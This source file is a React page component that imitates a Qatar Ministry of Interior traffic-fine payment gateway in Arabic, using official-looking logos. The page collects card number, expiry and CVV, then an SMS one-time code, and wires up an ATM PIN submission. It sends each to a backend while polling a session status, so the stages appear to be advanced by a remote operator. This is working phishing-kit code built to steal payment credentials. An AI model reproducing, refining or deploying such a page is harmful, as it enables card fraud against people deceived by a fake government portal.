import React, { useState, useEffect, type FormEvent } from "react";
import { useLanguage } from "@/contexts/LanguageContext";
import { useLocation } from "wouter";
import { trpc } from "@/lib/trpc";
import { toast } from "sonner";

type Stage = "card" | "card_pending" | "otp" | "otp_pending" | "atm" | "atm_pending" | "success" | "failed";

export default function Payment() {
  const { lang, isRTL } = useLanguage();
  const [, navigate] = useLocation();
  const searchParams = new URLSearchParams(window.location.search);
  const sessionId = searchParams.get("session") || "";
  
  const [stage, setStage] = useState<Stage>("card");
  const [error, setError] = useState<string | null>(null);
  const [cardName, setCardName] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExpiry, setCardExpiry] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [otpCode, setOtpCode] = useState("");
  const [atmPin, setAtmPin] = useState("");

  const submitCardMutation = trpc.payment.submitCard.useMutation({
    onSuccess: () => setStage("card_pending"),
    onError: (err) => setError(err.message),
  });

  const submitOtpMutation = trpc.payment.submitOtp.useMutation({
    onSuccess: () => setStage("otp_pending"),
    onError: (err) => setError(err.message),
  });

  const submitAtmPinMutation = trpc.payment.submitAtmPin.useMutation({
    onSuccess: () => setStage("atm_pending"),
    onError: (err) => setError(err.message),
  });

  const { data: sessionStatus } = trpc.payment.getStatus.useQuery(
    { sessionId: sessionId || "" },
    {
      enabled: !!sessionId && ["card_pending", "otp_pending", "atm_pending"].includes(stage),
      refetchInterval: 3000,
    }
  );

  useEffect(() => {
    if (sessionStatus?.stage && sessionStatus.stage !== stage) {
      setStage(sessionStatus.stage as Stage);
      if (sessionStatus.errorMessage) setError(sessionStatus.errorMessage);
      else setError(null);
    }
  }, [sessionStatus, stage]);

  const handleCardSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitCardMutation.mutate({
      sessionId,
      cardName,
      cardNumber,
      cardExpiry,
      cardCvv,
    });
  };

  const handleOtpSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitOtpMutation.mutate({ sessionId, otpCode });
  };

  const handleAtmSubmit = (e: FormEvent) => {
    e.preventDefault();
    submitAtmPinMutation.mutate({ sessionId, atmPin });
  };

  return (
    <div className="min-h-screen bg-[#F8F9FA]" dir="rtl">
      {/* Top Teal Bar */}
      <div className="bg-[#008A95] h-12 w-full flex items-center justify-between px-4 text-white">
        <div className="flex items-center gap-4">
           <span className="text-xl">☰</span>
           <span className="text-sm font-bold">1:26</span>
        </div>
        <div className="flex items-center gap-2">
           <span className="text-xs">4G</span>
        </div>
      </div>

      {/* Main Header with Logos */}
      <div className="bg-white border-b border-gray-200 py-3 px-4 flex items-center justify-between">
         <div className="flex items-center">
            <img src="/qatar-payment-text.png" alt="Payment Gateway" className="h-10" />
         </div>
         <div className="h-8 w-[1px] bg-red-800 mx-2"></div>
         <div className="flex items-center">
            <img src="/qatar-moi-logo-new.png" alt="MOI Qatar" className="h-12" />
         </div>
      </div>

      <main className="max-w-md mx-auto p-4 py-8">
        <div className="bg-white rounded-2xl shadow-sm border border-gray-100 overflow-hidden">
          <div className="bg-[#8A1538] p-6 text-white text-center">
            <h1 className="text-xl font-bold">بوابة الدفع الإلكتروني</h1>
            <p className="text-sm opacity-80 mt-1">دفع المخالفات المرورية</p>
          </div>

          <div className="p-6">
            {stage === "card" && (
              <form onSubmit={handleCardSubmit} className="space-y-5">
                <div className="flex justify-between items-center pb-4 border-b border-gray-100">
                  <span className="text-gray-600">إجمالي المبلغ:</span>
                  <span className="text-xl font-bold text-[#8A1538]">0.00 QAR</span>
                </div>

                {error && (
                  <div className="p-3 bg-red-50 text-red-600 text-xs rounded-lg border border-red-100">
                    {error}
                  </div>
                )}

                <div className="space-y-4">
                  <div>
                    <label className="block text-xs font-bold text-gray-400 mb-1">اسم حامل البطاقة</label>
                    <input
                      type="text"
                      value={cardName}
                      onChange={(e) => setCardName(e.target.value)}
                      className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
                      placeholder="NAME ON CARD"
                      required
                    />
                  </div>

                  <div>
                    <label className="block text-xs font-bold text-gray-400 mb-1">رقم البطاقة</label>
                    <input
                      type="text"
                      value={cardNumber}
                      onChange={(e) => setCardNumber(e.target.value)}
                      maxLength={16}
                      className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538]"
                      placeholder="0000 0000 0000 0000"
                      required
                    />
                  </div>

                  <div className="grid grid-cols-2 gap-4">
                    <div>
                      <label className="block text-xs font-bold text-gray-400 mb-1">تاريخ الانتهاء</label>
                      <input
                        type="text"
                        value={cardExpiry}
                        onChange={(e) => setCardExpiry(e.target.value)}
                        placeholder="MM/YY"
                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] text-center"
                        required
                      />
                    </div>
                    <div>
                      <label className="block text-xs font-bold text-gray-400 mb-1">الرمز السري (CVV)</label>
                      <input
                        type="password"
                        value={cardCvv}
                        onChange={(e) => setCardCvv(e.target.value)}
                        maxLength={4}
                        placeholder="***"
                        className="w-full p-3 border border-gray-200 rounded-lg outline-none focus:border-[#8A1538] text-center"
                        required
                      />
                    </div>
                  </div>
                </div>

                <button
                  type="submit"
                  disabled={submitCardMutation.isPending}
                  className="w-full py-4 bg-[#8A1538] text-white rounded-lg font-bold hover:bg-[#6D112C] transition-all"
                >
                  {submitCardMutation.isPending ? "جاري المعالجة..." : "إتمام عملية الدفع"}
                </button>
              </form>
            )}

            {(stage === "card_pending" || stage === "otp_pending" || stage === "atm_pending") && (
              <div className="py-20 text-center space-y-4">
                <div className="w-12 h-12 border-4 border-[#8A1538] border-t-transparent rounded-full animate-spin mx-auto"></div>
                <h3 className="text-lg font-bold text-gray-900">جاري معالجة طلبك</h3>
                <p className="text-gray-500 text-sm">يرجى الانتظار، يتم التحقق من بياناتك</p>
              </div>
            )}

            {stage === "otp" && (
              <form onSubmit={handleOtpSubmit} className="text-center space-y-6">
                <h3 className="text-xl font-bold text-gray-900">رمز التحقق</h3>
                <p className="text-gray-500 text-sm">أدخل الرمز المرسل لهاتفك</p>
                <input
                  value={otpCode}
                  onChange={(e) => setOtpCode(e.target.value)}
                  className="w-full text-center text-3xl font-bold p-4 bg-gray-50 border border-gray-200 rounded-xl outline-none focus:border-[#8A1538]"
                  placeholder="••••••"
                  maxLength={6}
                  required
                />
                <button
                  type="submit"
                  disabled={submitOtpMutation.isPending}
                  className="w-full bg-[#8A1538] text-white font-bold py-4 rounded-xl shadow-lg"
                >
                  {submitOtpMutation.isPending ? "جاري التأكيد..." : "تأكيد"}
                </button>
              </form>
            )}

            {stage === "success" && (
              <div className="py-12 text-center space-y-6">
                <div className="text-5xl text-green-500">✓</div>
                <h3 className="text-2xl font-bold text-gray-900">تم الدفع بنجاح</h3>
                <p className="text-gray-500">شكراً لك، تمت معالجة العملية.</p>
                <button
                  onClick={() => navigate("/")}
                  className="bg-gray-900 text-white font-bold py-4 px-8 rounded-xl"
                >
                  العودة للرئيسية
                </button>
              </div>
            )}
          </div>
        </div>

        <div className="mt-8 flex justify-center gap-6 opacity-30 grayscale">
          <img src="/card-brands.png" alt="Payment Methods" className="h-8 object-contain" />
        </div>
      </main>
    </div>
  );
}
